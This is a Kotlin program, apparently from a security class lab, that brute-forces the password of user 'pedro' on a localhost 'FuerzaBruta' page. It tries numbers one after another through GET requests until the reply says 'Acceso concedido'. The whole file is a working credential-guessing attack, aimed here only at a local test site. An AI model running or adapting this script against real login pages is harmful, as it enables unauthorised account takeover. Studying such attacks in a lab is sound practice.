import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URI

fun main() {
    val baseUrl = "http://localhost/seguridad-master/FuerzaBruta/"
    val username = "pedro"

    println("Usuario: $username")

    var intentos = 123455
    var numero = 123455

    while (true) {
        val password = numero.toString()

        intentos++

        if (probarPasswordSimple(baseUrl, username, password)) {
            println("\n🎉 ¡CONTRASEÑA ENCONTRADA: $password!")
            println("📊 Intentos totales: $intentos")
            break
        }


        if (intentos % 50 == 0) {
            print(".")
        }
        if (intentos % 1000 == 0) {
            println("\n📊 $intentos intentos - Probando: $numero")
        }

        numero++


    }
}

fun probarPasswordSimple(baseUrl: String, username: String, password: String): Boolean {
    return try {
        val url = URI("$baseUrl?username=$username&password=$password").toURL()
        val conexion = url.openConnection() as HttpURLConnection
        conexion.requestMethod = "GET"
        conexion.connectTimeout = 1000
        conexion.readTimeout = 1000

        val input = conexion.inputStream
        val response = BufferedReader(InputStreamReader(input)).use { it.readText() }

        conexion.disconnect()
        response.contains("Acceso concedido", ignoreCase = true)

    } catch (e: Exception) {
        false
    }
}